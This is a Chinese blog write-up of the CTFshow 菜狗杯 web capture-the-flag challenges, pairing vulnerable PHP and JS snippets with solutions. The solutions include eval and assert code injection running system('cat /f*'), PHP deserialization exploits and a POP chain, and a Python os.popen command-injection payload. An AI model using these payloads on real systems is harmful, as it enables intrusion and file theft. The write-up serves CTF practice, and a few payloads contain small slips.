---
title: CTFSHOW_菜狗杯
date: 2022-10-21 23:20:17
excerpt: CTFSHOW_菜狗杯
categories: 复现
---

# CTFSHOW_菜狗杯





## web签到





```php
<?php

error_reporting(0);
highlight_file(__FILE__);

eval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]][6][0][7][5][8][0][9][4][4]);
```

一个看似很绕的代码，我们一层一层的看：

**$_COOKIE['CTFshow-QQ群:']**

我们将**cookie**里的**CTFshow-QQ群:**的值设置为a，

现在内容就是

```
$_REQUEST[$_GET[$_POST[a]]]
```

然后接着是post方式传入a=b

```
$_REQUEST[$_GET[b]]
```

然后用get方式传入b=c

```
$_REQUEST[c][6][0][7][5][8][0][9][4][4]);
```

REQUEST我们既可以用get方式也可以用post方式

```
c[6][0][7][5][8][0][9][4][4]=system('cat /f*');
```

这里要注意cookie中的**<u>CTFshow-QQ群:</u>**含有中文字符

我们要将中文字符进行url解码

```
CTFshow-QQ%E7%BE%A4:=a
```







## web2 c0me_t0_s1gn  

F12

![图片-1680664313075](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445898.png)

提示说去控制台

```
try to run the function "g1ve_flag()" to get the flag!
```

![图片-1680664326857](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445782.png)







## 我的眼里只有$

```php
<?php

error_reporting(0);
extract($_POST);
eval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);
highlight_file(__FILE__);
```

变量嵌套问题，先给$_赋值：$__=a,然后给a赋值，以此类推一共有36个$，所有我们要赋值36次，写个脚本来跑一下

```python
import string
s = string.ascii_letters 
t='_=a&'
code="phpinfo();"
for i in range(35):
    t+=s[i]+"="+s[i+1]+'&'

t+=s[i]+'='+code
print(t)

```

payload

```
_=a&a=b&b=c&c=d&d=e&e=f&f=g&g=h&h=i&i=j&j=k&k=l&l=m&m=n&n=o&o=p&p=q&q=r&r=s&s=t&t=u&u=v&v=w&w=x&x=y&y=z&z=A&A=B&B=C&C=D&D=E&E=F&F=G&G=H&H=I&I=J&I=system('cat /f*');
```







## 一言既出

```
 <?php
highlight_file(__FILE__); 
include "flag.php";  
if (isset($_GET['num'])){
    if ($_GET['num'] == 114514){
        assert("intval($_GET[num])==1919810") or die("一言既出，驷马难追!");
        echo $flag;
    } 
} 

```

> assert里面如果是字符串的话，会将字符串当作php代码执行，与eval不同的一点是，结尾不需要分号

payload

```
?num=114514);//      将前面闭合并且注释掉后面的部分（妙啊）

?num=114514%2b1805296     %2b为加号url编码，两个相加等于1919810

?num=114514);1919810    跟第一种方法类似
```







## 驷马难追            

```php
<?php
highlight_file(__FILE__); 
include "flag.php";  
if (isset($_GET['num'])){
     if ($_GET['num'] == 114514 && check($_GET['num'])){
              assert("intval($_GET[num])==1919810") or die("一言既出，驷马难追!");
              echo $flag;
     } 
} 

function check($str){
  return !preg_match("/[a-z]|\;|\(|\)/",$str);

```

相较于上一个题，过滤了字母，分号，括号，仍然可以用%2b绕过



payload

```
?num=114514%2b1805296
```







## TapTapTap

F12控制台求值，flag在

```
/secret_path_you_do_not_know/secretfile.txt
```







## webshell

```php
 <?php 
    error_reporting(0);

    class Webshell {
        public $cmd = 'echo "Hello World!"';

        public function __construct() {
            $this->init();
        }

        public function init() {
            if (!preg_match('/flag/i', $this->cmd)) {
                $this->exec($this->cmd);
            }
        }

        public function exec($cmd) {
            $result = shell_exec($cmd);
            echo $result;
        }
    }

    if(isset($_GET['cmd'])) {
        $serializecmd = $_GET['cmd'];
        $unserializecmd = unserialize($serializecmd);
        $unserializecmd->init();
    }
    else {
        highlight_file(__FILE__);
    }

?> 
```

一到简单的反序列化题目

目标点在webshell类上的init函数，反序列化后直接执行。。。



exp

```php
 <?php 
 class Webshell {
 
        public $cmd = 'cat f*';
        
}  
echo serialize(new Webshell);
?> 
// O:8:"Webshell":1:{s:3:"cmd";s:6:"cat f*";} 
```







## 化零为整            

```
 <?php

highlight_file(__FILE__);
include "flag.php";

$result='';

for ($i=1;$i<=count($_GET);$i++){
    if (strlen($_GET[$i])>1){
        die("你太长了！！");
        }
    else{
    $result=$result.$_GET[$i];
    }
}

if ($result ==="大牛"){
    echo $flag;
}

```

中文在php里面长度是3，其实很容易想到中文的url编码就是3个

我们将大牛进行url编码

```
%E5%A4%A7%E7%89%9B
```



payload

```
/?1=%E5&2=%A4&3=%A7&4=%E7&5=%89&6=%9B
```







## 无一幸免

```
 <?php
include "flag.php";
highlight_file(__FILE__);

if (isset($_GET['0'])){
    $arr[$_GET['0']]=1;
    if ($arr[]=1){
        die($flag);
    }
    else{
        die("nonono!");
    }
}

```

代码部分7，8行条件判断，这里$arr[]=1是个赋值操作，也就是说代码走到这里if条件始终为ture，可以die出flag，那么给0可随便赋值。空值也无所谓。



payload

```
?0=0
```







## 传说之下（雾）            

```
var nowScore = this.score += 1
```

js代码中第275行，将这个改为

```
var nowScore = this.score += 2077
```





## 算力超群            

抓个包先

```
GET /_calculate?number1=5&operator=*&number2=6 HTTP/1.1
```

传递了3个参数，我们分别对这个三个参数污染一下

发现number1,operator都有过滤，对number2时直接报错了

直接对number2 RCE



payload

```
/_calculate?number1=5&operator=*&number2=__import__('os').popen('cat /f*').read()
```







## 遍地飘零

```
 <?php
include "flag.php";
highlight_file(__FILE__);

$zeros="000000000000000000000000000000";

foreach($_GET as $key => $value){
    $$key=$$value;
}

if ($flag=="000000000000000000000000000000"){
    echo "好多零";
}else{
    echo "没有零，仔细看看输入有什么问题吧";
    var_dump($_GET);
}

```

本题考察的是变量覆盖

我们传入?_GET=flag

```
var_dump($_GET);=>  var_dump($flag);
```





## 茶歇区

抓包

没怎么搞懂，看wp说是php整数溢出，



payload

```
a=0&b=0&c=0&d=0&e=999999999999999999&submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81
```







## 小舔田

```
 <?php
include "flag.php";
highlight_file(__FILE__);

class Moon{
    public $name="月亮";
    public function __toString(){
        return $this->name;
    }
    
    public function __wakeup(){
        echo "我是".$this->name."快来赏我";
    }
}

class Ion_Fan_Princess{
    public $nickname="牛夫人";

    public function call(){
        global $flag;
        if ($this->nickname=="小甜甜"){
            echo $flag;
        }else{
            echo "以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家".$this->nickname."。\n";
            echo "你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n";
        }
    }
    
    public function __toString(){
        $this->call();
        return "\t\t\t\t\t\t\t\t\t\t----".$this->nickname;
    }
}

if (isset($_GET['code'])){
    unserialize($_GET['code']);

}else{
    $a=new Ion_Fan_Princess();
    echo $a;
}

```

在Ion_Fan_Princess类下的 call函数可以 echo $flag

Ion_Fan_Princess类的__toString可以出发call函数

Moon类 下的 __wakeup可以触发 ____toString



pop链

```
Moon::__wakeup => Ion_Fan_Princess::__toString => Ion_Fan_Princess::call
```



exp

```
 <?php
class Moon{
    public $name;
}

class Ion_Fan_Princess{
    public $nickname="小甜甜";
    
}
$a=new Moon;
$b=new Ion_Fan_Princess;
$a->name=$b;

echo serialize($a);
//  <?php
class Moon{
    public $name;
    
}

class Ion_Fan_Princess{
    public $nickname="小甜甜";
    
}
$a=new Moon;
$b=new Ion_Fan_Princess;
$a->name=$b;

echo serialize($a);
// O:4:"Moon":1:{s:4:"name";O:16:"Ion_Fan_Princess":1:{s:8:"nickname";s:9:"小甜甜";}}
```



payload

```
?code=O:4:"Moon":1:{s:4:"name";O:16:"Ion_Fan_Princess":1:{s:8:"nickname";s:9:"小甜甜";}}
```